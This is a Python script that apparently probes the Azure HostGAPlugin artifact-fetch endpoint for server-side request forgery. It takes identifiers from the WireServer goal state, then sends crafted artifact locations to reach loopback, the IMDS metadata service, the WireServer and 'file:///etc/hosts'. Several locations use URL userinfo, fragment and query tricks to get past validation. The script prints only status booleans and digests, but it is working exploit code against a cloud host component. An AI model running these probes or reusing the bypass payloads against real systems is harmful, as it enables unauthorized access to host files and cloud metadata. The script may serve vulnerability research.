#!/usr/bin/env python3
"""Bounded Meta LHE classifier for the Azure HostGAPlugin fetch boundary.

No response body, URL credential, container ID, role configuration name, or
exception text is emitted.  The probe compares only body digests in memory and
prints status/shape booleans for a current extension manifest and fixed,
non-mutating URI-validation controls.
"""

from __future__ import annotations

import hashlib
import http.client
import json
import ssl
import urllib.parse
import xml.etree.ElementTree as ET
from typing import Any


PREFIX = "META_LHE_FAIRCHEM_HOSTGAPLUGIN"
WIRE_HOST = "168.63.129.16"
HOST_PLUGIN_PORT = 32526
TIMEOUT_SECONDS = 8
MAX_BODY = 1024 * 1024
GOAL_STATE_PATH = "/machine?comp=goalstate"
PUBLIC_CONTROL = (
    "https://raw.githubusercontent.com/facebookresearch/fairchem/"
    "d733f489c2e9257f92545e9b20af916a8fea2a8a/LICENSE.md"
)
LOOPBACK_VERSIONS = "http://127.0.0.1:32526/versions"
IMDS_INSTANCE = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
WIRESERVER_GOAL_STATE = "http://168.63.129.16/machine?comp=goalstate"


def body_bucket(length: int) -> str:
    if length == 0:
        return "0"
    if length < 256:
        return "1-255"
    if length < 4096:
        return "256-4095"
    if length < 65536:
        return "4096-65535"
    if length <= MAX_BODY:
        return "65536-1048576"
    return "over-limit"


def read_bounded(response: http.client.HTTPResponse) -> tuple[bytes, bool]:
    data = response.read(MAX_BODY + 1)
    return data[:MAX_BODY], len(data) > MAX_BODY


def http_get(
    host: str,
    port: int,
    path: str,
    headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    connection = http.client.HTTPConnection(host, port, timeout=TIMEOUT_SECONDS)
    try:
        connection.request("GET", path, headers=headers or {})
        response = connection.getresponse()
        data, truncated = read_bounded(response)
        return {
            "ok": True,
            "status": response.status,
            "content_type": response.getheader("content-type", ""),
            "data": data,
            "truncated": truncated,
        }
    except (OSError, http.client.HTTPException) as exc:
        return {"ok": False, "error_class": type(exc).__name__, "data": b""}
    finally:
        connection.close()


def direct_url(url: str, headers: dict[str, str] | None = None) -> dict[str, Any]:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        return {"ok": False, "error_class": "UnsupportedDirectURL", "data": b""}
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = urllib.parse.urlunsplit(("", "", parsed.path or "/", parsed.query, ""))
    if parsed.scheme == "https":
        connection: http.client.HTTPConnection = http.client.HTTPSConnection(
            parsed.hostname,
            port,
            timeout=TIMEOUT_SECONDS,
            context=ssl.create_default_context(),
        )
    else:
        connection = http.client.HTTPConnection(
            parsed.hostname, port, timeout=TIMEOUT_SECONDS
        )
    try:
        connection.request("GET", path, headers=headers or {})
        response = connection.getresponse()
        data, truncated = read_bounded(response)
        return {
            "ok": True,
            "status": response.status,
            "content_type": response.getheader("content-type", ""),
            "data": data,
            "truncated": truncated,
        }
    except (OSError, http.client.HTTPException, ssl.SSLError) as exc:
        return {"ok": False, "error_class": type(exc).__name__, "data": b""}
    finally:
        connection.close()


def body_shape(data: bytes, content_type: str = "") -> dict[str, Any]:
    lowered = data.lower()
    json_valid = False
    xml_valid = False
    try:
        json.loads(data)
        json_valid = True
    except (json.JSONDecodeError, UnicodeDecodeError):
        pass
    try:
        ET.fromstring(data)
        xml_valid = True
    except (ET.ParseError, ValueError):
        pass
    markers = {
        "invalid_uri": b"invaliduri" in lowered or b"invalid uri" in lowered,
        "unsupported_scheme": (
            b"unsupported scheme" in lowered or b"scheme is not supported" in lowered
        ),
        "forbidden": b"forbidden" in lowered or b"not authorized" in lowered,
        "blocked": b"blocked" in lowered or b"not allowed" in lowered,
        "metadata_header_required": (
            b"metadata" in lowered and b"required" in lowered
        ),
        "connection_failure": (
            b"connection refused" in lowered
            or b"name or service not known" in lowered
            or b"timed out" in lowered
        ),
        "invalid_container_configuration": (
            b"invalidcontainerconfiguration" in lowered
            or (b"container" in lowered and b"invalid" in lowered)
        ),
        "invalid_artifact_location": (
            b"artifact" in lowered
            and (b"invalid" in lowered or b"location" in lowered)
        ),
        "sas_validation": b"sas" in lowered or b"signature" in lowered,
        "storage_domain_validation": (
            b"storage" in lowered or b"blob.core" in lowered
        ),
    }
    media_class = "other"
    normalized_type = content_type.lower()
    if "json" in normalized_type:
        media_class = "json"
    elif "xml" in normalized_type:
        media_class = "xml"
    elif normalized_type.startswith("text/"):
        media_class = "text"
    elif normalized_type:
        media_class = "binary"
    return {
        "body_nonempty": bool(data),
        "body_length_bucket": body_bucket(len(data)),
        "json_valid": json_valid,
        "xml_valid": xml_valid,
        "media_class": media_class,
        "policy_or_backend_markers": markers,
        "raw_body_emitted": False,
    }


def public_result(value: dict[str, Any]) -> dict[str, Any]:
    if not value.get("ok"):
        return {
            "request_completed": False,
            "error_class": value.get("error_class", "UnknownError"),
            "raw_error_emitted": False,
        }
    return {
        "request_completed": True,
        "status": value["status"],
        "truncated": value.get("truncated", False),
        **body_shape(value["data"], value.get("content_type", "")),
    }


def get_goal_state() -> tuple[dict[str, Any], str, str, str, bytes]:
    result = http_get(
        WIRE_HOST,
        80,
        GOAL_STATE_PATH,
        {"x-ms-version": "2012-11-30"},
    )
    if not result.get("ok") or result.get("status") != 200:
        raise RuntimeError("goal state request unavailable")
    root = ET.fromstring(result["data"])
    container_id = root.findtext(".//ContainerId") or ""
    config_name = root.findtext(".//ConfigName") or ""
    extensions_config_uri = root.findtext(".//ExtensionsConfig") or ""
    if not container_id or not config_name or not extensions_config_uri:
        raise RuntimeError("goal state identifiers unavailable")
    return (
        public_result(result),
        container_id,
        config_name,
        extensions_config_uri,
        result["data"],
    )


def fetch_artifact(
    container_id: str,
    config_name: str,
    target: str,
    manifest_location: str | None = None,
) -> dict[str, Any]:
    headers = {
        "x-ms-version": "2015-09-01",
        "x-ms-containerid": container_id,
        "x-ms-host-config-name": config_name,
        "x-ms-artifact-location": target,
    }
    if manifest_location:
        headers["x-ms-artifact-manifest-location"] = manifest_location
    return http_get(
        WIRE_HOST,
        HOST_PLUGIN_PORT,
        "/extensionArtifact",
        headers,
    )


def same_body(left: dict[str, Any], right: dict[str, Any]) -> bool:
    if not left.get("ok") or not right.get("ok"):
        return False
    if left.get("status") != right.get("status"):
        return False
    left_body = left.get("data", b"")
    right_body = right.get("data", b"")
    return bool(left_body) and hashlib.sha256(left_body).digest() == hashlib.sha256(
        right_body
    ).digest()


def extract_current_manifest(extensions_config: bytes) -> str:
    root = ET.fromstring(extensions_config)
    candidates: list[str] = []
    for element in root.iter():
        location = element.attrib.get("location", "")
        if location:
            candidates.append(location)
    for element in root.findall(".//Uri"):
        if element.text:
            candidates.append(element.text.strip())
    for candidate in candidates:
        parsed = urllib.parse.urlsplit(candidate)
        if parsed.scheme in ("http", "https") and parsed.hostname:
            return candidate
    raise RuntimeError("current extension manifest unavailable")


def digest_equality_groups(values: dict[str, dict[str, Any]]) -> list[list[str]]:
    groups: dict[tuple[int, bytes], list[str]] = {}
    for name, value in values.items():
        if not value.get("ok"):
            continue
        data = value.get("data", b"")
        key = (int(value.get("status", 0)), hashlib.sha256(data).digest())
        groups.setdefault(key, []).append(name)
    return sorted(
        (sorted(names) for names in groups.values()),
        key=lambda names: names[0],
    )


def main() -> int:
    try:
        (
            goal_public,
            container_id,
            config_name,
            extensions_config_uri,
            goal_body,
        ) = get_goal_state()
        extensions_config = direct_url(
            extensions_config_uri, {"x-ms-version": "2012-11-30"}
        )
        if not extensions_config.get("ok") or extensions_config.get("status") != 200:
            raise RuntimeError("extensions config request unavailable")
        current_manifest = extract_current_manifest(extensions_config["data"])
        manifest_host = urllib.parse.urlsplit(current_manifest).hostname or ""
        if not manifest_host:
            raise RuntimeError("current extension manifest host unavailable")
    except (RuntimeError, ET.ParseError, OSError) as exc:
        print(
            f"{PREFIX}_json="
            + json.dumps(
                {
                    "schema": "meta-lhe-fairchem-hostgaplugin-boundary-v2",
                    "supported": False,
                    "error_class": type(exc).__name__,
                    "raw_error_emitted": False,
                },
                sort_keys=True,
                separators=(",", ":"),
            )
        )
        return 0

    versions = http_get(
        WIRE_HOST,
        HOST_PLUGIN_PORT,
        "/versions",
        {"x-ms-containerid": container_id},
    )
    direct_public = direct_url(PUBLIC_CONTROL)
    direct_imds = direct_url(IMDS_INSTANCE)
    direct_manifest = direct_url(current_manifest)
    quoted_manifest = urllib.parse.quote(current_manifest, safe="")
    target_specs: dict[str, tuple[str, str | None]] = {
        "current_extension_manifest": (current_manifest, None),
        "public_control_with_manifest_context": (PUBLIC_CONTROL, current_manifest),
        "loopback_with_manifest_context": (LOOPBACK_VERSIONS, current_manifest),
        "loopback_allowed_host_userinfo": (
            f"http://{manifest_host}@127.0.0.1:32526/versions",
            current_manifest,
        ),
        "loopback_allowed_host_fragment": (
            f"{LOOPBACK_VERSIONS}#{manifest_host}",
            current_manifest,
        ),
        "loopback_allowed_url_query": (
            f"{LOOPBACK_VERSIONS}?source={quoted_manifest}",
            current_manifest,
        ),
        "imds_allowed_host_userinfo": (
            f"http://{manifest_host}@169.254.169.254/metadata/instance"
            "?api-version=2021-02-01",
            current_manifest,
        ),
        "wireserver_allowed_host_userinfo": (
            f"http://{manifest_host}@168.63.129.16/machine?comp=goalstate",
            current_manifest,
        ),
        "host_file_with_manifest_context": ("file:///etc/hosts", current_manifest),
    }
    fetched = {
        name: fetch_artifact(container_id, config_name, target, manifest_location)
        for name, (target, manifest_location) in target_specs.items()
    }

    classified = {name: public_result(value) for name, value in fetched.items()}
    valid_manifest_match = same_body(
        fetched["current_extension_manifest"], direct_manifest
    )
    public_match = same_body(
        fetched["public_control_with_manifest_context"], direct_public
    )
    loopback_matches = {
        name: same_body(fetched[name], versions)
        for name in (
            "loopback_with_manifest_context",
            "loopback_allowed_host_userinfo",
            "loopback_allowed_host_fragment",
            "loopback_allowed_url_query",
        )
    }
    imds_match = same_body(fetched["imds_allowed_host_userinfo"], direct_imds)
    direct_goal = {"ok": True, "status": 200, "data": goal_body}
    wireserver_match = same_body(
        fetched["wireserver_allowed_host_userinfo"], direct_goal
    )
    parsed_manifest = urllib.parse.urlsplit(current_manifest)

    result = {
        "schema": "meta-lhe-fairchem-hostgaplugin-boundary-v2",
        "scope": "current extension manifest plus fixed non-mutating URI-validation controls",
        "supported": True,
        "goal_state": goal_public,
        "goal_state_identifiers_present": True,
        "goal_state_identifiers_emitted": False,
        "extensions_config": public_result(extensions_config),
        "current_manifest": {
            "scheme": parsed_manifest.scheme,
            "host_is_azure_blob": bool(
                parsed_manifest.hostname
                and parsed_manifest.hostname.endswith(".blob.core.windows.net")
            ),
            "query_present": bool(parsed_manifest.query),
            "url_emitted": False,
        },
        "host_plugin_versions": public_result(versions),
        "targets": classified,
        "response_equality_groups": digest_equality_groups(fetched),
        "comparisons": {
            "current_manifest_matches_direct_guest_fetch": valid_manifest_match,
            "public_control_with_manifest_matches_direct_guest_fetch": public_match,
            "loopback_variants_match_host_plugin_versions": loopback_matches,
            "imds_userinfo_variant_matches_direct_guest_response": imds_match,
            "wireserver_userinfo_variant_matches_current_goal_state": wireserver_match,
        },
        "conclusions": {
            "normal_extension_artifact_relay_confirmed": valid_manifest_match,
            "arbitrary_public_fetch_with_manifest_context_confirmed": public_match,
            "host_loopback_fetch_confirmed": any(loopback_matches.values()),
            "azure_imds_content_fetch_confirmed": imds_match,
            "current_vm_wireserver_fetch_confirmed": wireserver_match,
            "host_file_read_confirmed": (
                fetched["host_file_with_manifest_context"].get("status") == 200
                and bool(fetched["host_file_with_manifest_context"].get("data"))
            ),
            "uri_normalization_bypass_confirmed": (
                any(loopback_matches.values()) or imds_match or wireserver_match
            ),
        },
        "requests_sent": 15,
        "methods": ["GET"],
        "network_scan_performed": False,
        "response_bodies_emitted": False,
        "credentials_emitted": False,
        "external_state_changed": False,
    }
    print(f"{PREFIX}_json={json.dumps(result, sort_keys=True, separators=(',', ':'))}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
